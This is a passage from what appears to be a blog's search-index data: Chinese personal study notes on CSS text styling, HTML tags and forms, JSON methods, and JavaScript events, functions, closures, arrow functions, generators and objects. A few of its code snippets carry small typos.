注意版权，以免不必要的纠纷 行高（行间距）1line-height:40px; line-height设置行高 1相当与100% 文字默认在行高中垂直居中显示 行间距=行高－字体大小 行高也可以在font中设置 12/* 字体大小/行高 */font: 16px/30px &quot;字体&quot;; 单行字体想在父元素中居中显示时只需将字体的行高设置与父元素一致 设置样式时注意覆盖问题 文本样式text-tansform none默认 captalize单词首字母大写 uppercase都大写 lowercase都小写 text-decoration修饰 none underline下划线 overline上划线 line-through删除线 超链接默认text-decoration默认是underline letter-spacing修改字符间距 word-spacing单词间距(中文没多大用) text-align设置对齐方式 left靠 左，默认 right靠右 center居中 justify两端对齐 text-indent设置首行缩进 1text-indent:2em; 正值向右 负值向左 IDE-Hbuildx 常用快捷键 意义 ctrl+insert 快速复制行 alt+/ 代码提示 ctrl+k 格式化文本 p.class1+tab 快速创建元素 ！+tab 得到整体框架 ctrl+] 包围tag ctrl+shift+k 反格式化 p.class1$*8+tab IDE-VScode里面的插件很好用","link":"/Front-end/CSS/CSS%E5%9F%BA%E7%A1%80.html"},{"title":"基础","text":"参考尚硅谷李立波老师的h5和c3课程，MDN官方和w3school 网页三要素结构 HTML用于描述页面的结构 表现 CSS用于控制页面中元素的样式 行为 JavaScript用于响应用户的操作 HTML Hype Text Markup Language超文本标记语言，可以包括音乐，图片等 是网页中的结构 使用标签的形式来标识网页的不用组成部分 标准结构1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;标题，会影响网页在搜索引擎中的排名&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- 网页内容--&gt; &lt;h1&gt;我的网页&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; [new]简单布局h5的新标签 123456789101112131415&lt;body&gt; &lt;!-- 网页头部 --&gt; &lt;header&gt;&lt;/header&gt; &lt;!-- 网页主体 --&gt; &lt;main&gt; &lt;!-- 导航信息 --&gt; &lt;nav&gt;&lt;/nav&gt; &lt;!-- 中间内容 --&gt; &lt;article&gt;&lt;/article&gt; &lt;!-- 右边信息 --&gt; &lt;aside&gt;&lt;/aside&gt; &lt;/main&gt; &lt;!-- 网页底部 --&gt; &lt;footer&gt; &lt;/footer&gt;&lt;/body&gt; 语法规范1.html不区分大小写 2.注释不可以嵌套使用 3.结构必须完整，标签名要么成对使用，要么自结束 4.标签名可以嵌套使用，但不能交叉嵌套 5.属性必须有值，且值要有引号，单双都可以 文档声明用来告诉浏览器我们使用H5的标准，防止怪异解析 &lt;!doctype html&gt; 标签与属性 成对标签，在开始标签里可以放属性(名值对) &lt;h1&gt; &lt;/h1&gt; 自结束标签 &lt;meta /&gt; 基本标签 meta标签用来设置网页的一些元数据，比如字符集，关键字，简介等 h1标签比较重要，对于搜索引擎，h1仅次于title，只能写一个 p标签代表一个段落 br标签代表换行 hr代表水平线 pre预格式标签，在里面的文字是什么格式就显示什么格式 font标签可以吧文字包起来设置一些属性，比如字体face，颜色color，大小size(1-7) center用来居中 文本标签1234567891011121314151617181920212223242526272829&lt;em&gt;&lt;/em&gt;&lt;!-- 语义为表示语气上的强调，斜体emphasize --&gt;&lt;i&gt;&lt;/i&gt;&lt;!-- 单纯斜体italic --&gt;&lt;strong&gt;&lt;/strong&gt;&lt;!-- 语义为强调内容，粗体 --&gt;&lt;b&gt;&lt;/b&gt;&lt;!-- 单纯粗体bold --&gt;&lt;small&gt;&lt;/small&gt;&lt;!-- 比父元素的字体小一些，有语义 ，表示细则，比如版权--&gt;&lt;cite&gt;&lt;/cite&gt;&lt;!-- 表示参考内容，书名歌名 --&gt;&lt;q&gt;&lt;/q&gt;&lt;!-- 表示短的应用，如一句名言，浏览器会加引号 --&gt;&lt;blockquote&gt;&lt;/blockquote&gt;&lt;!-- 表示块级引用（独占一行） --&gt;&lt;sup&gt;&lt;/sup&gt;&lt;!-- 上标 --&gt;&lt;sub&gt;&lt;/sub&gt;&lt;!-- 下标 --&gt;&lt;del&gt;&lt;/del&gt;&lt;!-- delete表示删除的内容，添加删除线 --&gt;&lt;ins&gt;&lt;/ins&gt;&lt;!-- insert表示插入的内容，加下划线 --&gt;&lt;code&gt;&lt;/code&gt;&lt;!-- 表示代码，不保留格式 --&gt;&lt;pre&gt;&lt;/pre&gt;&lt;!-- 是一个预格式标签，保存格式显示 --&gt;&lt;!-- 结合code和pre表示代码 --&gt; 实体其实就是转义，将一些特殊字符显示出来就叫实体 如： &lt;less than 用&amp;lt;表示 &gt;greater than 用&amp;gt;表示 空格用&amp;nbsp;表示（不换行） 插入图片&lt;img src=&quot;这是图片路径&quot; alt=&quot;这是图片描述&quot; /&gt; 属性 width：单位px height：单位px 只设置一个时会按照比例变化 一般在自适应页面才需要 图片格式 JEPG:支持的颜色多，可压缩，不支持透明，用来保存颜色丰富照片 GIF:颜色少，可支持简单透明，支持动态图 PNG:颜色多，支持复杂透明 使用原则：效果不一致，用效果好的；效果一致用小的 100%表示继承父元素 meta 设置关键字 1&lt;meta name=&quot;keywords&quot; content=&quot;我的关键字内容，使用逗号隔开&quot;&gt; 设置描述 1&lt;meta name=&quot;description&quot; content=&quot;我的描述内容&quot;&gt; 数据重定向 1&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;秒数;url=地址&quot; /&gt; 参考W3school 内联框架 可以在一个网页中显示另一个网页，但另一个网页内容不会被搜索引擎检索 1&lt;iframe&gt; &lt;/iframe&gt; 属性 src：指向某个路径，可以是外部，可以是相对 width height name：指定一个name属性 超链接1&lt;a href=&quot;#&quot; target=&quot;打开的位置&quot;&gt; 超链接名字&lt;/a&gt; 创建超链接时，如果地址不确定可使用#作为占位符，点击会回到顶部 可在任意标签设置id属性，利用href=”某id”，可直接跳转到指定位置 属性target_self：在本页面打开_blank：新建页面 属性href(hypetext reference) 超文本引用，定义web资源位置 在内联框架中可设置一个name属性，利用target=”name”，可以使超链接在内联框架中打开 每个元素都可以设置一个id，id在同一个页面不能重复 href=&quot;mailto:邮件地址&quot;会打开计算机的邮件客户端 内联元素和块元素12345&lt;div&gt; &lt;!-- 块元素--&gt;&lt;/div&gt; &lt;!--内联元素--&gt;&lt;span&gt;&lt;/span&gt; div独占一行，不管内容多少，一般用来布局 p，h1，h2 fspan用来选中文字 a，img，iframe 一般用块去包含内联元素 a不可以包含自身 p不可以放块元素 列表无序列表1234&lt;ul&gt; &lt;li&gt;hello&lt;/li&gt; &lt;li&gt;world&lt;/li&gt;&lt;/ul&gt; ul(unordered lists)表示无序列表，用li列项 通过type表示项目符号 disc square circle 一般不用默认项目符号 123ul{list-style:none;} ​ 删除默认项目符号 ul和li都是块元素 有序列表1234&lt;ol&gt; &lt;li&gt;hello&lt;/li&gt; &lt;li&gt;world&lt;/li&gt;&lt;/ol&gt; 有序列表ol(ordered lists)，用li列项，有顺序 type属性默认值 1默认值，数字 a/A使用字母 i/I罗马数字 ol也是块元素 定义列表1234&lt;dl&gt; &lt;dt&gt;HTML&lt;/dt&gt; &lt;dd&gt;网页标记语言&lt;/dd&gt;&lt;/dl&gt; dl(definition lists) 有两个子标签 dt被定义内容 dd定义内容 都是块元素 列表可以嵌套使用 各种缩写全称 ul是unordered lists的缩写 (无序列表)li是list item的缩写 （列表项目）ol是ordered lists的缩写（有序列表）dl是definition lists的英文缩写 (自定义列表)dt是definition term的缩写 (自定义列表组)dd是definition description的缩写（自定义列表描述）nl是navigation lists的英文缩写 （导航列表）tr是table row的缩写 （表格中的一行）th是table header cell的缩写 （表格中的表头）td是table data cell的缩写 （表格中的一个单元格）cell (巢)[翻译的好怪.]cellpadding （巢补白）cellspacing （巢空间）","link":"/Front-end/HTML/1.%E5%9F%BA%E7%A1%80.html"},{"title":"表格与表单","text":"表格123456789101112131415161718&lt;table border=&quot;1px&quot; align=&quot;center&quot;&gt; &lt;tr&gt; &lt;th&gt;a1&lt;/th&gt; &lt;th&gt;a2&lt;/th&gt; &lt;th colspan=&quot;2&quot;&gt;a3&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;b1&lt;/td&gt; &lt;td&gt;b2&lt;/td&gt; &lt;td&gt;b3&lt;/td&gt; &lt;td rowspan=&quot;2&quot;&gt;b4&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;c1&lt;/td&gt; &lt;td&gt;c2&lt;/td&gt; &lt;td&gt;c3&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 用table(块)创建表格 tr(row)代表一行 td(data cell)代表单元格 th(header cell)表头单元格 colspan纵向合并 rowspan横向合并 table和td之间默认有一个距离，使用border-spacing可以设置这个距离 border-collapse可以合并表格的边框，设置之后border-spacing失效 合并单元格 1&lt;td rowspan=&quot;2&quot;&gt;b4&lt;/td&gt; 隔行变色 1234567tr:nth-child(even){ background-color:yellowgreen;}tr:hover{ background-color:red;}/*IE8不支持*/ 长表格 当表格过长时，需要将表格分为三部分，表头，表格的主题，表格底部 1234567891011121314151617181920212223242526&lt;table border=&quot;1px&quot; align=&quot;center&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;a1&lt;/th&gt; &lt;th&gt;a2&lt;/th&gt; &lt;th&gt;a3&lt;/th&gt; &lt;th&gt;a4&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt;b1&lt;/td&gt; &lt;td&gt;b2&lt;/td&gt; &lt;td&gt;b3&lt;/td&gt; &lt;td &gt;b4&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot&gt; &lt;tr&gt; &lt;td&gt;c1&lt;/td&gt; &lt;td&gt;c2&lt;/td&gt; &lt;td&gt;c3&lt;/td&gt; &lt;td&gt;c4&lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt;&lt;/table&gt; 三个标签来表示 thead表头 tbody主体 tfoot表格底部 特点 区分表的不同部分 都是table的子标签 三者随便排序，它们总会按顺序显示 如果没写tbody，浏览器会自己默认写上并将所有tr放入tbody 已经过时的布局方式，表格列数以td最多的决定，表格可以嵌套，耦合程度高，不易维护 完善clearfix解决了高度塌陷和父子元素垂直外边距重叠问题 1234567.clearfix:before,.clearfix:after{ content:&quot;&quot;; display:table; clear:both;}/*table对父子外边距重叠有效，也对高度塌陷有效*/ 表单作用向服务器提交信息 比如：注册 登录 百度搜索 使用from标签创建表单，用它提交不同的表单项 格式12345678User&lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;br /&gt;Password&lt;input type=&quot;password&quot;/&gt;&lt;br/&gt;&lt;!-- submit表示提交，value可以自定义提交按钮名字。在文本框里也可以指定value，它会作为默认值写在框里--&gt;&lt;input type=&quot;submit&quot; value=&quot;注册&quot;/&gt; form必须指定action这个属性，它指向一个服务器地址，表单会提交给这个服务器 用户填写的信息会在url地址后面以查询字符串的形式发给服务器 url?字符串 1http://127.0.0.1:8848/demo01/target.html?username=ffff 多个名值对时 属性名(name)=属性值&amp;属性名=属性值 input为内联元素 也可以用button创建提交按钮(type值为submit) 单选按钮123性别&lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;male&quot; /&gt;男&lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;female&quot; /&gt;女&lt;br&gt;&lt;br&gt; input创建单选按钮，type为radio 通过name分组 需要用户选择的表单项，要有value(给服务器)，不然无法区分 多选框12345爱好 &lt;input type=&quot;checkbox&quot; name=&quot;language&quot; value=&quot;Java&quot;&gt;Java&lt;input type=&quot;checkbox&quot; name=&quot;language&quot; value=&quot;C&quot;&gt;C&lt;input type=&quot;checkbox&quot; name=&quot;language&quot; value=&quot;C++&quot;&gt;C++&lt;input type=&quot;checkbox&quot; name=&quot;language&quot; value=&quot;Python&quot;&gt;Python&lt;br&gt;&lt;br&gt; 使用input的type为checkbox创建 下拉列表1234567编程难受吗&lt;select name=&quot;coding&quot;&gt; &lt;option value =&quot;ok&quot;&gt;还行&lt;/option&gt; &lt;option value =&quot;ok2&quot;&gt;可以&lt;/option&gt; &lt;option value =&quot;?&quot;&gt;想哭&lt;/option&gt; &lt;option value =&quot;??&quot;&gt;难受&lt;/option&gt;&lt;/select&gt; 通过select创建,option创建列表项 name给select设置，value给option设置 默认选中 只需要将option添加selected=’selected’即可 1&lt;option value =&quot;ok2&quot; selected='selected&gt;可以&lt;/option&gt; 或者在input加checked=’check’ 1&lt;input type=&quot;checkbox&quot; name=&quot;language&quot; value=&quot;Java&quot; checked='check'&gt;Java 在select中添加multiple=’multiple’，变成多选下拉列表 1&lt;select name=&quot;coding&quot; multiple='multiple'&gt; 在select中使用optgroup（添加label进行分组名）对项进行分组，将option包起来 12345678910111213编程难受吗&lt;select name=&quot;coding&quot;&gt; &lt;optgroup label=&quot;自我感觉良好&quot;&gt; &lt;option value =&quot;ok&quot;&gt;还行&lt;/option&gt; &lt;option value =&quot;ok2&quot;&gt;可以&lt;/option&gt; &lt;/optgroup&gt; &lt;optgroup label=&quot;啥玩意&quot;&gt; &lt;option value =&quot;?&quot;&gt;想哭&lt;/option&gt; &lt;option value =&quot;??&quot;&gt;难受&lt;/option&gt; &lt;/optgroup&gt;&lt;/select&gt; 标签创建文本域使用textarea可以输入多行文本 1&lt;textarea&gt;&lt;/textarea&gt; 按钮123&lt;button type=&quot;button&quot;&gt;普通的按钮&lt;/button&gt;&lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;&lt;button type=&quot;reset&quot;&gt;重置&lt;/button&gt; 重置按钮 input的type值为reset button的type属性值为reset 普通的按钮input的type值为button创建按钮 button的type值为button创建按钮 由于button是成对出现的标签，所以更加灵活 其他 提示文字一般都用label包起来，label有一个属性for，通过设值与文本的id值结合，点击文字也可以进入输入框 12&lt;label for=&quot;um&quot;&gt;User&lt;/label&gt;&lt;input id=&quot;um&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt; 使用fieldset标签对表单进行分组 legend标签编辑分组名 1234567&lt;fieldset&gt; &lt;legend&gt;用户信息&lt;/legend&gt; &lt;label for=&quot;um&quot;&gt;User&lt;/label&gt; &lt;input id=&quot;um&quot; type=&quot;text&quot; name=&quot;username&quot; /&gt; &lt;br /&gt;&lt;br&gt; Password&lt;input type=&quot;password&quot;/&gt;&lt;/fieldset&gt; 框架集123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;frameset cols=&quot;30%,*, 30%&quot;&gt; &lt;frame src=&quot;float.html&quot; &gt; &lt;frame src=&quot;form.html&quot; &gt; &lt;frameset rows=&quot;50%,50%&quot;&gt; &lt;frame src=&quot;long table.html&quot; &gt; &lt;frame src=&quot;navigation_bars.html&quot; &gt; &lt;/frameset&gt; &lt;/frameset&gt;&lt;/html&gt; 和内联框架相似，使用frameset创立 特点是可以引入多个页面（利用子标签frame） ros水平排列 clos垂直排列 必须设置一个，不然只能加载一个页面 框架集与body不能共存 frameset可以嵌套使用 内容不会被检索，而且不能有自己的内容，而且每单独加载一个页面就要加载一个请求 毒瘤IE6不支持png24，需要使用png8才能透明 条件hack123&lt;!--[if IE 6]&gt; &lt;p&gt;请远离IE6，谢谢配合&lt;/p&gt;&lt;![endif]--&gt; 因为有一些代码在某些浏览器需要执行，儿某些浏览器不需要执行，这时用 到css-hack 只对IE10以下有效，其他浏览器会识别为注释 if后面可以加一个lt，gt，lte，gte，! 属性hack针对IE浏览器的，尽量不用，具体查w3cschool 123_background-color:red;*background-color:red;background-color:red\\0;","link":"/Front-end/HTML/3.%E8%A1%A8%E6%A0%BC%E5%92%8C%E8%A1%A8%E5%8D%95.html"},{"title":"了解JSON","text":"JSON 是一种按照JavaScript对象语法的数据格式，这是 Douglas Crockford 推广的。虽然它是基于 JavaScript 语法，但它独立于JavaScript，这也是为什么许多程序环境能够读取（解读）和生成 JSON。 JSON可以作为一个对象或者字符串存在，前者用于解读 JSON 中的数据，后者用于通过网络传输 JSON 数据。 这不是一个大事件——JavaScript 提供一个全局的 可访问的 JSON 对象来对这两种数据进行转换。 一个 JSON 对象可以被储存在它自己的文件中，这基本上就是一个文本文件，扩展名为 .json， 还有 MIME type 用于 application/json.—MDN JSON对象1234567891011121314151617181920212223242526272829303132333435363738394041{ &quot;squadName&quot; : &quot;Super hero squad&quot;, &quot;homeTown&quot; : &quot;Metro City&quot;, &quot;formed&quot; : 2016, &quot;secretBase&quot; : &quot;Super tower&quot;, &quot;active&quot; : true, &quot;members&quot; : [ { &quot;name&quot; : &quot;Molecule Man&quot;, &quot;age&quot; : 29, &quot;secretIdentity&quot; : &quot;Dan Jukes&quot;, &quot;powers&quot; : [ &quot;Radiation resistance&quot;, &quot;Turning tiny&quot;, &quot;Radiation blast&quot; ] }, { &quot;name&quot; : &quot;Madame Uppercut&quot;, &quot;age&quot; : 39, &quot;secretIdentity&quot; : &quot;Jane Wilson&quot;, &quot;powers&quot; : [ &quot;Million tonne punch&quot;, &quot;Damage resistance&quot;, &quot;Superhuman reflexes&quot; ] }, { &quot;name&quot; : &quot;Eternal Flame&quot;, &quot;age&quot; : 1000000, &quot;secretIdentity&quot; : &quot;Unknown&quot;, &quot;powers&quot; : [ &quot;Immortality&quot;, &quot;Heat Immunity&quot;, &quot;Inferno&quot;, &quot;Teleportation&quot;, &quot;Interdimensional travel&quot; ] } ]} 访问形式 123superHeroes.hometownsuperHeroes[&quot;active&quot;]superHeroes[&quot;members&quot;][1][&quot;powers&quot;][2] JSON数组12345678910111213141516171819202122[ { &quot;name&quot; : &quot;Molecule Man&quot;, &quot;age&quot; : 29, &quot;secretIdentity&quot; : &quot;Dan Jukes&quot;, &quot;powers&quot; : [ &quot;Radiation resistance&quot;, &quot;Turning tiny&quot;, &quot;Radiation blast&quot; ] }, { &quot;name&quot; : &quot;Madame Uppercut&quot;, &quot;age&quot; : 39, &quot;secretIdentity&quot; : &quot;Jane Wilson&quot;, &quot;powers&quot; : [ &quot;Million tonne punch&quot;, &quot;Damage resistance&quot;, &quot;Superhuman reflexes&quot; ] }] 访问形式 12[0].powers[0][0][&quot;powers&quot;][0] 注意事项 JSON 是一种纯数据格式，它只包含属性，没有方法。 JSON 要求有两头的 { } 来使其合法。最安全的写法是有两边的括号，而不是一边。 甚至一个错位的逗号或分号就可以导致 JSON 文件出错。您应该小心的检查您想使用的数据(虽然计算机生成的 JSON 很少出错，只要生成程序正常工作)。您可以通过像 JSONLint 的应用程序来检验 JSON。 JSON 可以将任何标准合法的 JSON 数据格式化保存，不只是数组和对象。比如，一个单一的字符串或者数字可以是合法的 JSON 对象。虽然不是特别有用处…… 不像 JavaScript 标识符可以用作属性，在 JSON 中，只有字符串才能用作属性。 序列化stringify(): 接收一个JS对象作为参数，返回一个对应的JSON字符串。 123456789var person = { name: 'manuev', age:19, height:1.60,}var myStirng = JSON.stringify(person);/*{&quot;name&quot;: &quot;manuev&quot;,&quot;age&quot;: 19,&quot;height&quot;: 1.6}*/ stringify可以传递三个参数，第一个是js对象，第二个是指定输出的对象的属性，可以使用数组，第三个是缩进，如 1234567JSON.stringify(person,['name','age'],' ')/*&quot;{ &quot;name&quot;: &quot;manuev&quot;, &quot;age&quot;: 19}&quot;*/ 第二个参数还可以传递一个函数，用来处理每个键值对 12345678910111213JSON.stringify(person, (k,v)=&gt;{ if(typeof v === 'string') return v.toUpperCase(); return v;},' ');/*&quot;{ &quot;name&quot;: &quot;SHEPHERDEV&quot;, &quot;age&quot;: 19, &quot;height&quot;: 1.6}&quot;*/ 控制js对象的序列化数据，还有一个方法就是在对象里写一个toJSON()方法，里面返回应该处理的对象 12345678910111213var person = { name: 'manuev', age:19, height:1.60, // 注意不能用箭头函数 toJSON:function(){ return { 'Name': this.name, 'Age': this.age }; }};//&quot;{&quot;Name&quot;:&quot;manuev&quot;,&quot;Age&quot;:19}&quot; 反序列化parse(): 以文本字符串形式接受JSON作为参数，并返回相应的JS对象。 12var myText = '{ &quot;name&quot; : &quot;manuev&quot;, &quot;age&quot; : &quot;19&quot; }';var myJSON = JSON.parse(myText); 它的第二个参数也可以接收一个函数用来处理解析的属性 1234567JSON.parse(myText,(k,v)=&gt;{ if(k === 'name'){ return 'hello '+v; } return v;})// Object { name: &quot;hello manuev&quot;, age: &quot;19&quot; }","link":"/Front-end/JavaScript/JSON.html"},{"title":"JavaScript事件","text":"所谓事件，就是当你在执行某个动作会引发其他的函数 为一个元素添加事件有很多方法，一是直接在HTML里内联（不推荐，不方便维护），二是事件处理属性，如下 1.焦点事件.onfocus，解除焦点状态.onblur 2.点击事件.onclick 3.双击时间.ondbclick 4.按下并松开事件.onkeypress，按下.onkeydown，松开onkeyup，只能是window对象 5.鼠标滑入事件.onmouseover，鼠标移出事件.onmouseout 注释: 将您的编程逻辑与内容分离也会使您的站点对搜索引擎更加友好。 三是使用addEventLisener(event type,linsener)，第一个参数是事件类型，第二个是函数，可以使匿名函数，但注意，这种方法不兼容IE8及以下 事件对象执行函数的对象，通常作为参数传递给函数 示例: 下面是有16个格子，点击会随机变换颜色 .mydiv { background-color: red; height: 100px; width: 25%; float: left; } const wrapper = document.querySelector('.wrapper'); for(let i = 1; i","link":"/Front-end/JavaScript/%E4%BA%8B%E4%BB%B6.html"},{"title":"JS函数","text":"浏览器内置了很多函数，比如alert()，全称是window.alert() 还有DOM（文档对象模型）的很多方法等等 自定义函数1234function funName(p1,p2){ //fun body return 1;} 注意调用方式，如果将按钮和函数绑在一起，()是否书写效果是不一样的，()是函数调用运算符，匿名函数就相当与不写()的情况 12button.onclick = funName();/*这代表不需要点击就调用*/button.onclick = funName;/* 需要点击才调用*/ 匿名函数123function (){ //funbody} 匿名函数一般与事件联系在一起 12345var myButton = document.querySelector('button');myButton.onclick = function() { alert('hello');} 名字空间为了避免不同文件的变量和函数名重复，可以将所有变量和函数绑定在一个全局变量里，如 123456let GLOBAL = {};GLOBAL.v1 = 1;GLOBAL.fun = function(){return 0;} 高阶函数 高阶函数英文叫Higher-order function。那么什么是高阶函数？ JavaScript的函数其实都指向某个变量。既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为高阶函数。 map可以快速的将数组的每个元素按照规则得到另一组数组 例如[1,2,3]得到[1,4,9]，常规思想是取出元素，进行运算，赋值给其他数组 12345678function mutiple(x){ return x*x;}let li1 = [1, 2, 3];let li2 = [];for(let i in li1){ li2.push(mutiple(li1[i]));} 使用map 12345function mutiple(x){ return x*x;}let li1 = [1, 2, 3];let li2 = li1.map(mutiple); 传入的mutiple就是函数本身，因为map将算法抽象了，所以很简洁，而且一眼就看出了新增了一个数组 第二个参数可选，代表索引 reducemap做的是简单运算，reduce做的是重复运算，传入reduce的函数必须有两个参数，一个作为算子计算，一个接收结果，简单算法如下 1[x1, x2, x3, x4].reduce(f) == f(f(f(x1, x2), x3), x4) 比如对一个数组求和 12345let arr = [1,2,3,4,5,6,7,8,9];function sum (x,y){ return x+y;}arr.reduce(sum);//45 filter可以过滤掉数组的元素，回调函数的第一个参数是元素(必选)，第二个参数是元素索引，第三个参数是数组本身，回调函数应返回一个boolean值来决定是否过滤 如过滤掉一个数组重复的元素 123456var arr = [1,2,3,4,1,2,3,4];arr.filter(function (element,index,self){ return self.indexOf(element) === index;})//因为indexOf返回第一个值的索引，所以后面的相同的数据就会被过滤 sort可以对数组进行排序，如果数组里是字符串，会按照首字母的ASCII码进行排序，首字母相同会按照第二个字母的ASCII码排序，以此类推 12let arr = ['a','A','Abc','abc']arr.sort();//[&quot;A&quot;, &quot;Abc&quot;, &quot;a&quot;, &quot;abc&quot;] 如果是数组，sort默认的方法是将数字转化为字符串，然后使用ASCII码的方式进行排序，如 12let arr = [12,22,2,15];arr.sort();//[12, 15, 2, 22] 但因为sort是高阶函数，它的回调函数接收两个值a、b 若a&lt;b，则返回一个负值表示a排在b之前 若a=b，则返回0 a&gt;b，返回一个大于0的数代表a排在后面 12345678// 升序arr.sort(function(x,y){ return x-y;})// 降序arr.sort(function(x,y){ return y-x;}) every测试每个元素是否满足条件 回调函数需要一个参数，会把所有元素传递给函数，会根据函数的返回结果返回布尔值 forEach会把所有元素传入回调函数，但不会返回任何值，经常用来遍历 find查找符合规则（自己写函数定义规则）的元素，返回该元素 findIndex返回索引 闭包除了将函数作为参数传入以外，还可以将函数返回，而闭包就是将返回一个变量环境的函数，也就是一个有状态的环境，如 12345678function wrapper(a,b){ function sum (){ return a+b; } return sum;}var sum1 = wrapper(3,4);sum1();// 返回7 注意使用sum1()时返回的函数才被调用，sum使用了外部函数的变量，返回的函数将参数保存了起来 因为返回的函数没有被立即执行，所以需要注意的一点就是返回的函数不能使用循环的变量，或则后续会变化的变量，如 123456789101112131415161718function count() { var arr = []; for (var i=1; i&lt;=3; i++) { arr.push(function () { return i * i; }); } return arr;}var results = count();var f1 = results[0];var f2 = results[1];var f3 = results[2];f1(); // 16f2(); // 16f3(); // 16 为什么会返回16呢，因为函数返回时，i已经变成了4 如果非要使用，就必须再创建一个函数将变量值存下来 1234567891011function count() { var arr = []; for (var i=1; i&lt;=3; i++) { arr.push((function (n) { return function(){ return n*n; } })(i)); } return arr;} 使用了一个‘创建就执行的匿名函数的语法’ 123(function (x) { return x * x;})(3); // 9 不加括号会报语法错误 使用场景模拟私有变量方法面向对象编程的语言里都可以在对象内封装一个私有变量，例如Java的private，而JS并没有这种机制，但使用闭包就可以封装一个私有变量或者方法 1234567891011121314151617181920212223242526var makeCounter = function () { var privateCounter = 0; function changeBy(val) { privateCounter += val; } return { increment: function() { changeBy(1); }, decrement: function() { changeBy(-1); }, value: function() { return privateCounter; } }};var Counter1 = makeCounter();var Counter2 = makeCounter();console.log(Counter1.value()); /* logs 0 */Counter1.increment();Counter1.increment();console.log(Counter1.value()); /* logs 2 */Counter1.decrement();console.log(Counter1.value()); /* logs 1 */console.log(Counter2.value()); /* logs 0 */ 箭头函数是ES6新增的一个函数定义方式，箭头函数表达式的语法比函数表达式更简洁，并且没有自己的this，arguments，super或new.target。箭头函数表达式更适用于那些本来需要匿名函数的地方，并且它不能用作构造函数。 如果函数只是一个表达式，那他的定义非常简单 12345x =&gt; x * x;// 相当于function (x) { return x * x;} 如果有语句 12345678x =&gt; { if (x &gt; 0) { return x * x; } else { return - x * x; }} 如果有多个参数或者无参数 123456789101112131415// 两个参数:(x, y) =&gt; x * x + y * y// 无参数:() =&gt; 3.14// 可变参数:(x, y, ...rest) =&gt; { var i, sum = x + y; for (i=0; i&lt;rest.length; i++) { sum += rest[i]; } return sum;} 如果要返回一个对象 1x =&gt; ({foo:x}) this针对前面说的this对象问题在函数的函数里面的指向问题，使用箭头函数就可以解决 123456789var obj = { birth: 1990, getAge: function () { var b = this.birth; // 1990 var fn = () =&gt; new Date().getFullYear() - this.birth; // this指向obj对象 return fn(); }};obj.getAge(); // 25 另外，箭头函数的call()和apply的第一个参数总是被忽略，他总是与外部调用者绑定 123456789var obj = { birth: 1990, getAge: function (year) { var b = this.birth; // 1990 var fn = (y) =&gt; y - this.birth; // this.birth仍是1990 return fn.call({birth:2000}, year); }};obj.getAge(2015); // 25 箭头函数不能使用new，没有prototype，不能作为生成器 关于箭头函数的一篇文章 generator生成器（generator）是ES6引入的数据类型，类似函数，但会返回多个值 函数碰到return就会返回值并结束这个函数，如果没有返回值就隐式的代表return undefined 而generator就是可以使用yield返回多次，比如利用它写一个计数器 123456789101112function* counter(){ let i= 0; while(true){ i++; yield i; } }var g = counter();g.next();//返回Object { value: 1, done: false }g.next();//返回Object { value: 2, done: false } 实际上也是一个带状态的值，如果在里面写return，执行到return时done就变成true，这个生成器也就结束了","link":"/Front-end/JavaScript/%E5%87%BD%E6%95%B0.html"},{"title":"JavaScript对象","text":"JavaScript的对象是一种无序的集合数据类型，它由若干键值对组成。 对象是一个包含相关数据和方法的集合，下面就是一个简单的对象 123456789101112var person = { name : ['Bob', 'Smith'], age : 32, gender : 'male', interests : ['music', 'skiing'], bio : function() { alert(this.name[0] + ' ' + this.name[1] + ' is ' + this.age + ' years old. He likes ' + this.interests[0] + ' and ' + this.interests[1] + '.'); }, greeting: function() { alert('Hi! I\\'m ' + this.name[0] + '.'); }//注意这里没有逗号}; 对象与值之间使用:隔开，对象里的string、number、array也叫对象的属性（property），对象里的函数也叫对象的方法（method），上面整个对象被称为对象的字面量（literal） 访问点表示法使用.来访问对象里的属性方法 12person.name;person.age; 对象也可以作为值 123456name: { first:'Bob', last:'Smith'}//访问person.name.first; 括号表示法12person['age'];person['name']; 与数组有点类似，不同的是：对象是字符串到值的映射，数组是数字到值的映射 设置值通过访问的形式修改 1person.age = 19; 也可以新增一个属性或者函数 1234person.other = 'other';person.fun = function(){ alert('hello world');} 括号表示法的优点就是可以动态的设置成员名字 123var dataName = 'height';var dataValue = '1.60cm';person[dataName] = dataValue; 构造函数与对象JS不像java那样可以使用class来声明类，而是使用了构造函数的特殊函数来定义 12345678910111213//简单定义function createNewPerson(name) { var obj = {}; obj.name = name; obj.greeting = function () { alert('Hi! I\\'m ' + this.name + '.'); } return obj;}//调用var salva = createNewPerson('salva');salva.name;salva.greeting(); 但这样定义有点不方便，因为创建一个空对象还要返回它，以下是一个便捷方法 12345678910//名字注意大写，代表他是一个类（构造函数）function Person(name) { this.name = name; this.greeting = function() { alert('Hi! I\\'m ' + this.name + '.'); };}//调用,使用new就会返回对象var person1 = new Person('Bob');var person2 = new Person('Sarah'); 注意：引用使用new才是才代表使用构造函数，里面的this才会绑定当前对象，为此构造函数名规定大写 封装new使用createPerson将new封装起来 1234567891011121314function Person(props) { this.name = props.name || '无名氏'; this.age = props.age || 0;}Person.prototype.greeting = function() { alert('Hi! I\\'m ' + this.name + '.'); };function createPerson(props){ return Person(props || {})}// 调用let 